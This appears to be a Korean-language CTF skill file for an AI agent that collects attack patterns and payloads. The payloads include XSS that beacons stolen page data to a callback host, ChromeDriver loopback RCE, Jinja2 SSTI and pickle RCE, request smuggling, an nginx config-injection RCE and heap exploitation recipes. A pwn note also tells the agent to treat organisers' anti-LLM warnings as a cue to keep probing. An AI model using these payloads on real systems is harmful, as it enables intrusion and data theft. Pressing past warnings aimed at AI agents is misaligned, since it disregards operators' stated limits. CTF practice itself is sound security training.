---
name: ctf-personal
description: >
  명종의 CTF 풀이 경험 기반 코드 템플릿과 공격 패턴 모음.
  카테고리별 ctf-* 스킬과 함께 로드되며, 범용 스킬에 없는
  개인 경험 패턴(bore.pub 콜백, ETag leak, nginx RCE 등)과
  자주 쓰는 코드 스니펫을 제공한다.
---

# 개인 CTF 코어 패턴

## 추가 리소스
- [war-stories.md](war-stories.md) - 특정 문제에서만 적용되는 특수 사례 기록. 유사 패턴 인식 시 참조.
- [platform-notes.md](platform-notes.md) - 플랫폼/환경별 특이사항 및 주의점.

---

## Web 패턴

### XSS + Bot 챌린지
1. XSS 페이로드 → 봇 방문 유도
2. document.cookie 또는 내부 fetch → bore.pub 콜백
3. CMS(WordPress 등) → 플러그인 업로드 CSRF 체이닝

**cloudflared 콜백 서버 사용 시 주의:**
```python
# 터널 URL 획득 후 바로 exploit 제출하면 0 hits (라우팅 미안정)
# 반드시 ~8초 대기
time.sleep(8)
```

### CSP Nonce CSS Leak + Cache Reuse XSS

`script-src 'nonce-...'`가 있고 `style-src 'unsafe-inline'`이면, CSS selector로 CSP meta `content`의 nonce 조각을 외부 URL로 leak할 수 있다.
대상 HTML이 `Cache-Control: no-cache`처럼 브라우저 캐시에 남고, XSS 데이터 API만 `no-store`라면 다음 체인이 가능하다.

체크리스트:
- `meta[content*="abc"]{background:url(//callback/l/abc)}`를 3-gram으로 생성해서 nonce를 복원한다.
- nonce를 얻은 뒤 저장형 payload를 `<iframe srcdoc="<script nonce=...>..."></script>">` 형태로 교체한다.
- 외부 stage iframe에서 top navigation이 막히면 `<iframe sandbox="allow-scripts allow-top-navigation" src=...>`를 쓴다.
- `srcdoc`의 `</script>`는 최종 srcdoc 값에서는 literal이어야 실행된다. 바깥 attribute escape로 DOMPurify만 통과시키고, 너무 일찍 `&lt;/script&gt;`로 고정하지 않는다.
- bfcache/cache 재진입은 hop 수를 bot 제한 시간 안에서 먼저 검증한다. cloudflared 경유는 hop당 1초 가까이 걸릴 수 있어 8~10 hop부터 테스트한다.

### Compression Dictionary Transport (CDT) 오염 -> mXSS

`Use-As-Dictionary`의 `id=`가 user-controlled title/path로 조립되면 structured-header injection을 먼저 본다.
서버가 `Dictionary-ID` 존재만 확인하고 실제 `Available-Dictionary` hash/body를 검증하지 않으면,
브라우저는 공격자 응답을 딕셔너리로 저장하고 서버는 다른 문서를 기준으로 압축하게 만들 수 있다.

실전 체크리스트:
- victim dictionary 문서를 한 번 직접 요청해서 서버 쪽 캐시를 먼저 워밍한다.
- 브라우저가 재사용할 match scope는 공격자 문서 경로(`/doc/<same-id>/*`)에 남기고, `id=`만 victim dictionary id로 바꾼다.
- 두 번째 응답은 길고 복잡한 핸들러보다 `javascript:` URL + `autofocus onfocus=location=href//` 형태가 안정적이다.
- 외부 콜백은 `navigator.sendBeacon('//callback', body)`가 짧고 `no-cors` 제약에서도 잘 동작한다.

짧은 형태:
```markdown
[x](java "autofocus onfocus=location=href//")
```

```text
title = script:(async()=>navigator.sendBeacon('//callback',await(await fetch('/admin')).text()))()//
```

### Stored XSS -> ChromeDriver Loopback RCE

Selenium 기반 bot이 `chromedriver --port=<ephemeral>`를 같은 컨테이너의 loopback에 띄운 상태라면,
저장형 XSS로 봇이 방문한 페이지에서 `127.0.0.1:<high-port>/status`를 스캔한 뒤
`POST /session`에 `goog:chromeOptions.binary`와 `args`를 넣어 **임의 바이너리 실행**이 가능하다.

실전 체크리스트:
- 신고 URL 검증이 외부 도메인을 막으면 `http://127.0.0.1:3000/posts/<id>` 같이 허용 origin으로 신고한다.
- 스캔은 `32768-60999` 범위를 작은 chunk(예: 64)로 돌리고, 열린 포트들에만 `/session`을 던진다.
- 첫 번째 열린 포트가 chromedriver가 아닐 수 있으니, 찾은 열린 포트들 여러 개에 같이 시도한다.
- 회수는 가장 단순하게 `/app/public/<name>.txt` 같은 정적 경로에 결과를 기록하게 만든다.

```javascript
const body = JSON.stringify({
  capabilities: { alwaysMatch: { "goog:chromeOptions": {
    binary: "/usr/bin/python3",
    args: ["-cimport pathlib;pathlib.Path('/app/public/leak.txt').write_text(open('/flag').read())"]
  }}}
});
```

### Unquoted Attribute XSS — 공백 금지 규칙

`onerror=PAYLOAD//>`처럼 unquoted attribute에 payload 넣을 때, **공백(space/tab/LF)이 속성값을 종료**시킨다.
`"`, `'`, `=`, `<`, `` ` ``는 parse error이지만 값에 추가됨. `>`는 태그 종료.

```html
<!-- 실패: return 뒤 공백에서 onerror 값이 잘림 -->
<img onerror=fetch('/buy').then(function(r){return r.json();})>

<!-- 성공: /**/ 로 공백 대체 (HTML 파서는 문자로 추가, JS는 whitespace로 처리) -->
<img onerror=fetch('/buy').then(function(r){return/**/r.json();})>
```

payload 작성 체크리스트:
- 공백 없음 (JS 전체 스캔)
- `>` 없음 (태그 조기 종료)
- `"` 없음 (quote context 파괴)
- 불가피한 공백 → `/**/` 대체

### SSRF + DNS Rebinding
1. 내부망 타겟 확인 (127.x, 10.x, 169.254.x.x)
2. rbndr.us DNS rebinding 설정
3. bore.pub 콜백 수신 (VPS 불필요)
4. 리다이렉트 루프 우회 (HTTPS-only, 빈 응답 주의)

### PromQL Namespace Post-Filter Blind Label Exfil

대시보드가 Prometheus 쿼리 결과를 받은 뒤 `metric.namespace == session.namespace`로 후처리 필터링하면,
직접 `namespace="system"` 결과를 볼 수 없어도 set operator로 **조건이 참일 때만 현재 namespace series를 반환**하게 만들어
라벨 값을 blind로 뽑을 수 있다.

전제:
- `agg` 같은 파라미터가 PromQL prefix로 삽입됨: `<agg>(<current_metric>{namespace="nsNNNN"})`
- `or(<fallback_metric>{namespace="nsNNNN"})`를 붙일 수 있음
- 현재 namespace에 값이 큰 metric(`user_active`)과 fallback 값이 작은 metric(`app_uptime=1`)이 있음

오라클 형태:
```text
agg = user_active and on() secret_config{flag=~"^PREFIX.*"} or
metric = app_uptime
```

`secret_config{flag=~"^PREFIX.*"}`가 존재하면 `user_active`가 반환되고, 아니면 `app_uptime`이 반환된다.
Prometheus regex는 PromQL 문자열 escape가 까다로우므로 `{`, `}`, `_`, 영숫자는 `[x]` char class로 표현하면 안정적이고,
`system` 같은 blacklist 단어도 `[s][y][s][t][e][m]` 형태로 피할 수 있다.

### Absolute-Form Request Target으로 Edge Path Filter 우회

프록시가 `GET /internal/...` 같은 origin-form path만 필터링하고, 업스트림 Fastify/Node가 absolute-form request target의 path를 다시 라우팅하면:

```http
POST http://x/internal/policy-seed HTTP/1.1
Host: target:8080
```

처럼 보내서 edge의 `/internal` 차단을 우회할 수 있다. 확인 순서:
- raw socket 또는 `curl --path-as-is --request-target` 계열로 absolute-form을 직접 전송한다.
- `GET http://x/internal/admin-console.json`이 edge 403 대신 앱 레벨 401/403을 주면 업스트림까지 도달한 것이다.
- 내부 seed/JWKS 계열 엔드포인트가 열리면, 업로드 가능한 PEM/키 자료와 조합해 verifier key를 주입한다.
- PEM 앞에 audit banner 개행이 붙으면 RSA PEM 감지가 깨져 HS256 대칭키처럼 처리되는지 같이 확인한다.

### Single-Read Pipeline Smuggling Through Edge Proxy

커스텀 프록시가 `httparse` 등으로 **첫 request-line만 검사/라우팅**하고, backend에는 같은 read buffer 전체를 그대로 쓰면,
첫 요청은 허용 경로로 두고 두 번째 요청에 내부 엔드포인트를 붙여 side effect를 만들 수 있다.

확인 포인트:
- 첫 요청에 `Content-Length`를 넣지 않아 proxy가 `header_end + body_len`으로 자르지 않게 만든다.
- 두 요청을 한 번의 `sendall()`로 이어 보내 TCP read buffer에 같이 들어가게 한다.
- edge가 첫 응답만 relay하고 연결을 닫아도, backend가 두 번째 요청을 이미 처리하면 Redis/DB 같은 side effect로 결과를 회수할 수 있다.
- 내부 API가 서명/HMAC/상태 헤더를 요구하면, smuggled 요청에 실제 backend path 기준으로 모두 맞춰 넣는다.

형태:
```http
GET /health/policy-engine HTTP/1.1
Host: target
Connection: keep-alive

POST /internal/admin/policy-override HTTP/1.1
Host: policy-engine
Authorization: Bearer ...
X-Internal-HMAC: ...
Content-Length: ...

...
```

### Validation Before Decoding Mismatch

입력 검사가 **percent-encoded 원문**에 걸리고, 실제 sink에 넣기 직전에 `QueryUnescape` 같은 디코딩이 한 번 더 수행되면 금지 문자를 되살릴 수 있다.

특히 다음 순서면 위험하다:
1. 정규식이 `%`, `#`, `;`, `}` 같은 문자만 허용
2. 검사는 decode 전에 수행
3. 이후 `QueryUnescape` 결과가 nginx/템플릿/DSL 설정값으로 들어감

`edge-gate` 계열 ingress-nginx admission RCE에서 유효했던 형태:
```text
http://example.com/#%3B%7D%7D%7D%0A%0Assl_engine%20../../../../../../mnt/share/payload.so%3B%0A%0A
```

체크리스트:
- raw 입력에 개행/세미콜론이 직접 들어가면 필터에 걸리는지 확인
- `%0A`, `%3B`, `%7D`, `%23`처럼 인코딩했을 때는 통과하는지 비교
- sink가 URL 자체가 아니라 "설정 문자열"로 재사용되는지 확인
- decode 이후 값이 별도 재검증 없이 config/template에 박히면 코드 주입 관점으로 전환

### SSTI
```python
# Jinja2 기본 확인
{{7*7}}  # → 49
# RCE
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
# 필터 우회: attr(), |join 등
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

### JWT
- alg:none → 서명 제거 후 페이로드 조작
- RS256→HS256 키 혼동: 공개키로 HS256 서명
- kid injection: `"kid": "../../dev/null"` → 빈 키
```python
import jwt
token = jwt.encode({"role":"admin"}, "", algorithm="none")
```

### 역직렬화
```python
# Python pickle RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
payload = pickle.dumps(Exploit())
```

### GraphQL
- Introspection으로 스키마 덤프
- 클라이언트 사이드 이스케이프 결함 우선 탐색
- 관리자 권한 mutation 탐색

---

## Pwn 패턴

### Decoy 포트 뒤에 공개 course 포트가 살아있는 유형
- 문제 설명에서 몇 개의 decoy endpoint만 강조해도, 연관된 공개 vhost/course site가 살아 있으면 거기에 적힌 원래 포트를 먼저 다시 스캔한다.
- 특히 교육용/랩형 문제는 `/page/...` 문서에 `ssh -p ...`, `:5151`, `:5301-5303` 같은 실제 공략 포트가 그대로 남아 있는 경우가 있다.
- 운영진이 anti-LLM 경고 문구를 의도적으로 넣은 경우, 그 문구 자체를 신호로 보고 서비스 전체를 버리지 말고 같은 도메인의 sibling port/vhost를 넓게 확인한다.

### WASM VM table-dispatch 상태 덮기
- `wasm2wat`에서 `call_indirect`가 `state + fixed_offsets`의 dword를 읽고 `xor/key` 뒤 table index로 쓰면, 보호된 wasm 메모리 안에서도 VM 상태 구조체가 곧 exploit surface다.
- 입력을 `fread(dst, 1, N, stdin)`류로 상태에 복사하면 raw NUL 포함 payload를 보내고, opcode 슬롯과 파일 경로/권한 플래그 조각을 같은 record 안에서 동시에 덮는다.
- table index는 elem segment 순서로 복원한다. 예: `elem[1] = f13`이면 opcode dword는 `1 ^ key`, `elem[40] = file_read`이면 `40 ^ key`.
- WASI `--dir=.` 샌드박스는 `path_open("files/flag.txt", "r")` 같은 허용 디렉터리 내부 읽기를 막지 않으므로, VM의 path concat 조각(`prefix`, `name`, `suffix`)을 `files/`, `flag`, `.txt`로 맞춘 뒤 read primitive를 호출한다.

```python
p = bytearray(80)
for off, idx in [(24, 25), (28, 33), (32, 40)]:  # set flags, then read
    p[off:off+4] = p32(idx ^ 0x37)
p[52:59] = b"files/\0"
p[60:65] = b"flag\0"
p[76:80] = b".txt"
```

### libc 식별
```python
# leak된 주소로 libc 버전 식별
# libc.rip 또는 libc.blukat.me 에서 검색
# 또는 docker_exec에서: python3 -c "from pwnlib.libcdb import *; print(search_by_symbol_offsets({'puts': 0xXXXXX}))"
```

### large tcache를 unsorted leak으로 강제 전환
- glibc가 `tcache_max`를 크게 열어 둔 환경에서는 `0x1010`급 large chunk도 tcache로 들어가서 unsorted leak이 안 나온다.
- 이때 `tcache_perthread_struct`의 `num_slots[idx]`와 `entries[idx]`를 heap UAF arbitrary write로 직접 0으로 덮으면, 다음 free에서 같은 size chunk를 unsorted bin으로 보낼 수 있다.
- leak 이후에는 `__exit_funcs` 포인터 자체를 새 fake list로 바꾸지 말고, 기존 head 노드의 `fn`/`arg`만 덮는 쪽이 write 수가 적고 안정적이다.
- exit handler는 pointer mangling(`rol((fn ^ guard), 0x11)`)을 쓰므로, `environ -> auxv -> AT_RANDOM` 또는 동등 경로로 guard를 먼저 확보해야 한다.
- stack leak이 없으면 `setcontext`를 exit handler로 걸고 heap 위 `ucontext_t` + ROP를 준비해 ORW로 마무리하는 경로를 우선 검토한다.

### 1-byte refcount wrap UAF -> exit context overlap
- `clone/copy`가 heap object header의 1바이트 참조 카운트를 `++`만 하고 width 검사를 안 하면, 원본 1에서 255회 clone으로 `0x00` wrap을 만들 수 있다.
- `delete`가 `refcnt == 0` 또는 `--refcnt == 0`에서 `free(buf)`를 호출하고 다른 alias slot을 지우지 않으면, 남은 alias로 dangling show/edit이 된다.
- 큰 chunk alias를 먼저 free해서 unsorted bin fd/bk를 leak하고, 같은 size class의 작은 chunk를 free한 뒤 프로그램 내부 context 객체(`exit`, `commit`, `rollback` root 등) 할당으로 겹치게 만든다.
- context 객체에 magic/guard 검사가 있으면 leak한 원본 값을 그대로 보존하고, `rsp/rip/rdi/rsi/rdx` 같은 call context 필드만 바꾼다.
- fake stack을 같은 object 안에 두면 callee의 `push`/`call`이 command string이나 fake fields를 덮을 수 있다. PIE leak이 있으면 `.bss` 높은 주소를 synthetic stack으로 쓰는 편이 안정적이다.

### history/cache eviction UAF -> stdout FSOP
- 이미지/미디어 preview 서비스가 최근 N개 history를 유지하면, "similar previous 선택"과 "oldest eviction" 순서를 먼저 본다. `A,B,C,D,A`처럼 같은 입력을 다시 넣었을 때 previous와 eviction 대상이 같아지면 UAF가 난다.
- freed tcache chunk가 preview/download 이미지에 섞여 나오면 첫 qword는 safe-linking key(`chunk >> 12`)일 수 있다. 반대로 current 이미지 첫 픽셀이 post-UAF `memmove`로 previous chunk에 들어가면 tcache fd overwrite primitive가 된다.
- large record leak은 UAF write가 unsorted fd/bk를 깨지 않게 small current로 previous large를 선택하게 만든다. leak 위치가 payload 문자(`0x4c4c...`, `0x4747...`)면 PNG 전체 row를 스캔하고 warm-up 수를 바꿔 backward consolidation을 피한다.
- glibc 2.39 + Full RELRO에서는 poisoned `malloc(0x220)`을 `_IO_2_1_stdout_`으로 보내 fake FILE을 복사하고, `_IO_wfile_jumps` 기반 House-of-Apple2 경로로 `system("true;cat flag")`를 호출하는 루트가 짧다.
- tcache poison과 fake FILE에는 heap page 기준 offset이 따로 필요할 수 있다. poison source chunk와 final current record 주소를 trace로 분리해서 잡고, trigger가 선택하는 history slot도 고정하면 원격 성공률이 올라간다.

### stack use-after-return note pointer -> current frame ROP
- note/compose 함수가 stack local buffer 주소를 global pointer로 저장하고 반환하면, 다음 menu handler의 같은 크기 stack frame이 그 주소를 재사용한다. handler 시작부의 `memset(local, 0, N)` 때문에 원본 note는 사라져도, global pointer는 현재 handler frame의 canary/saved RBP/return address 기준점이 된다.
- `peek(offset, length)`가 `global_ptr + signed_offset`를 bounds 없이 출력하면 `buffer+0x88` 부근에서 canary, `buffer+0x98`에서 PIE return, 상위 caller frame에서 libc return을 한 번에 leak한다. glibc 2.39에서는 main을 호출한 뒤 저장된 return address가 `libc_base + 0x2a1ca`인 형태를 먼저 확인한다.
- `append(length)`가 `global_ptr + global_len + i`에 raw byte를 쓰면, compose 때 `global_len`을 0x70~0x80 근처로 맞춰 canary 직전부터 덮는다. payload는 `pad -> leaked canary -> saved rbp -> ret alignment -> pop rdi -> "/bin/sh" -> system` 순서가 안정적이다.
- 로컬 Apple Silicon Docker/Rosetta에서는 `/proc/<pid>/maps`나 libc return offset이 실제 amd64 원격과 다를 수 있다. 원격 leak의 하위 12비트와 page-aligned base 검증을 우선하고, local offset을 맹신하지 않는다.

### Unicorn secure-world context UAF -> monitor auth
- Native 바이너리가 Unicorn으로 secure world를 돌리고 `shm/peek` 같은 shared-memory 디버그 명령을 제공하면, guest fault가 나도 native 명령 루프와 shared memory가 살아 있는지 먼저 확인한다. Fault 후 `peek`이 가능하면 guest 안에서 shared memory로 leak하고 native에서 회수하는 경로가 열린다.
- Custom allocator UAF에서 freed object chunk와 continuation/context chunk가 같은 size class면, object data write가 context의 `sp/x19/x20/x30` 복원 필드와 겹칠 수 있다. Magic/cookie가 context 앞쪽에 있으면 UAF가 `+0x10`부터 쓰는지 확인해 원본 guard를 보존한다.
- AArch64 guest에서 `ldp x8, x30, [sp], #0x10; ret` + `mov x0, x19; mov x1, x20; br x8` 조합은 fake stack 한 쌍으로 `target(x19, x20, leftover_x2)`를 만들 수 있다. 호출 후 LR이 꼬여 fault가 나더라도, target이 shared memory에 값을 복사했다면 leak primitive로 충분하다.
- Session 주소가 작은 후보군이면 `candidate + token_offset`을 guest append/memcpy 함수로 fake session in shared memory에 복사하고, 뒤따르는 고정 포인터/flag 값으로 올바른 후보를 식별한다. 틀린 후보 뒤에는 `reset`이 context pointer를 정리하는지 확인해 같은 연결에서 계속 brute-force한다.
- Auth/monitor gadget이 있으면 leak한 token으로 같은 context hijack을 다시 사용해 `x0=session, x1=token`을 넣고 monitor auth를 호출한다. 성공 시 context pointer를 0으로 지우는 gadget이면 이후 정상 명령(`cat /flag`, `read`)으로 마무리할 수 있다.

---

## Crypto 패턴

### RSA
```python
from Crypto.Util.number import *
# 작은 e (e=3): iroot(c, 3)
# n 소인수분해: factordb.com / sympy.factorint
# Wiener's attack: e가 매우 크고 d가 작을 때
# Common modulus: gcd(e1,e2)=1 → 확장 유클리드
# Hastad's broadcast: 같은 m을 여러 n,e로 암호화 → CRT
```

### AES
- ECB mode: 블록 경계 활용, chosen plaintext
- CBC mode: IV 조작, padding oracle
- CTR mode: 키스트림 재사용 → XOR

### 고전 암호
- Caesar: 26가지 brute force
- Vigenere: Index of Coincidence로 키 길이 추정
- XOR: 반복 키 → 키 길이 추정 후 frequency analysis

### 해시
1. hash_crack MCP로 자동 식별 + rockyou 크랙
2. 실패 시 hashcat rule 기반 변형 시도
3. Length extension attack (MD5/SHA1/SHA256)

---

## Reverse 패턴

### 주요 기법
- 안티디버깅: ptrace 체크 NOP 패치
- VM 난독화: 가상 명령어 세트 역분석
- Python 바이트코드: uncompyle6 / pycdc
- .NET: dnSpy로 디컴파일
- Android APK: jadx로 Java 소스 복원
- WASM: wasm2wat으로 텍스트 변환
- Go: 심볼 스트리핑 → GoReSym으로 복원
- Rust: 거대 바이너리, 패닉 문자열에서 함수 이름 힌트

### 원격 실행 코드가 파일 검증 오라클일 때
- 클라이언트가 서버에서 받은 x86-64 stage를 `mmap(PROT_EXEC)` 후 실행하고 `uint64 ret`만 돌려주면, stage 자체가 플래그 데이터를 직접 들고 있지 않아도 **로컬 파일 검증 오라클**일 수 있다.
- `open("flag.png")`, `mmap`, `cmp [mapped+off], embedded` 패턴이면 embedded bytes/constraints를 추출해서 파일을 재구성한다. 서버에는 실제 실행 결과 대신 성공값을 보내 다음 stage를 계속 받는다.
- 자주 나오는 stage 인코딩:
  - 직접 비교: `file[i] == enc[i]`
  - 인접 XOR/차분: `file[i-1] ^ file[i]`, `(file[i]-file[i-1]) & 0xff`
  - 두 배열 XOR: `file[i] ^ arr1[i] == arr2[i]`
  - 8바이트 선형식: 8x8 모듈러 방정식(`mod 65537`)으로 블록별 복원
- 중간에 `Solve: ... = ?`, figlet 숫자 `Input:`, `ptrace(PTRACE_TRACEME)` 같은 anti-automation stage가 섞이면 decoded stage를 실행하지 말고 문자열/OCR/고정 syscall 결과를 파싱해서 ret 값을 직접 전송한다.
- 커버리지는 `bytearray`로 추적하고, 겹치는 chunk는 conflict 검증한다. PNG/JPEG처럼 헤더/크기 검증 stage(`fstat`, `qword/dword cmp`)도 작은 chunk로 병합하면 앞부분 복원이 빨라진다.

### Z3 플래그 역산
```python
from z3 import *
s = Solver()
flag = [BitVec(f'c{i}', 8) for i in range(length)]
s.add(...)
if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[c].as_long()) for c in flag))
```

---

## Misc 패턴

### Pyjail / Bash Jail
- `__builtins__` 복원: `().__class__.__bases__[0].__subclasses__()`
- 문자 제한 우회: `chr()` 조합, exec/eval 체인
- bash 제한: `/???/??t /???/p?s?w?` 글로빙

### 스테가노그래피
- 이미지: LSB (stegsolve), zsteg, steghide
- JPEG clue형 문제에서 `outguess`가 여러 키에 대해 랜덤 바이너리를 그럴듯하게 뱉어도 속지 말 것. 힌트가 passphrase를 가리키면 `steghide extract -sf image.jpg -p '<key>'`를 먼저 병행해서 실제 ASCII 플래그/텍스트가 바로 나오는지 확인한다.
- 오디오: Audacity 스펙트로그램, SSTV
- 파일: binwalk 추출, foremost

### 숨은 싱크가 있는 mod-3 선형 격자 퍼즐

격자 셀 값이 `. ~ *`처럼 3상태이고 명령이 `ring -> [a+b,a+2b]`, `hush -> [2a+2b,2a+b]` 형태면 `.`을 0, `~/*`를 `±1`로 두고 각 셀의 bonded neighbor를 먼저 복원한다.

실전 절차:
- 각 셀에서 `ring` 1회 후 인접 칸 변화가 있으면 그 칸이 parent이고 `hush`로 복구한다.
- 변화가 없으면 `ring`을 한 번 더 눌러 비교한다. 인접 칸이 변하면 visible parent이며 `ring` 2회 추가로 복구한다.
- 그래도 인접 칸 변화가 없으면 hidden sink/altar parent다. 이 경우 hidden 값은 `a_after_ring - a_before`이고, hidden은 상태가 바뀌지 않는 상수일 수 있으므로 `ring` 총 3회가 원상복구다.
- parent 그래프가 hidden sink를 루트로 하는 트리면, 각 subtree를 `(node_value, parent_value, processed_children_mask)` 상태의 작은 Dijkstra/DP로 정리한다. visible parent edge는 두 값을 모두 갱신하고, hidden parent edge는 child 값만 갱신한다.

검증 포인트: solver가 만든 명령열은 로컬 시뮬레이션으로 모든 visible cell이 0이 되는지 먼저 확인하고, 원격 실행 중에는 현재 십자 시야의 non-`?` 값이 시뮬레이션과 일치하는지 몇 step마다 비교한다.

---

## Forensics 패턴

### 네트워크 캡처
- Wireshark: Follow TCP/HTTP stream
- TLS 복호화: 키로그 파일 활용
- USB HID: hidtool / USB-Mouse-Pcap-Visualizer

---

## OSINT 패턴

### Google Dorking
- `site:target.com filetype:pdf`
- `inurl:admin`, `intitle:"index of"`

### 이미지 OSINT
- exiftool → GPS 좌표 → Google Maps
- 역이미지: Google Images, TinEye, Yandex

---

## Web3 패턴

### Solidity 취약점
- reentrancy: checks-effects-interactions 위반
- integer overflow: SafeMath 미사용 (0.8 이전)
- tx.origin 인증: msg.sender로 우회
- selfdestruct: 강제 이더 전송

### 공격 도구
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://...'))
contract = w3.eth.contract(address=addr, abi=abi)
tx = contract.functions.attack().build_transaction({...})
```

---

## 자동 학습 규칙
풀이 완료 후 아래 기준에 따라 적절한 파일을 수정한다:

### SKILL.md에 추가하는 경우
- 여러 문제에 범용적으로 적용 가능한 새 기법
- 기존 범용 패턴의 새로운 변형/우회

### war-stories.md에 추가하는 경우
- 특정 문제/플랫폼/CVE에만 해당하는 경험
- 매우 특수한 조건의 풀이 패턴

### platform-notes.md에 추가하는 경우
- MCP 도구 사용 시 발견한 환경별 주의사항
- 특정 CTF 플랫폼(Dreamhack, HackTheBox 등)의 특이 동작

수정 형식:
1. 해당 섹션에 패턴 추가
2. 패턴명, 핵심 원리, 간단한 코드/페이로드 예시 포함
3. 기존 내용은 절대 삭제하지 않음
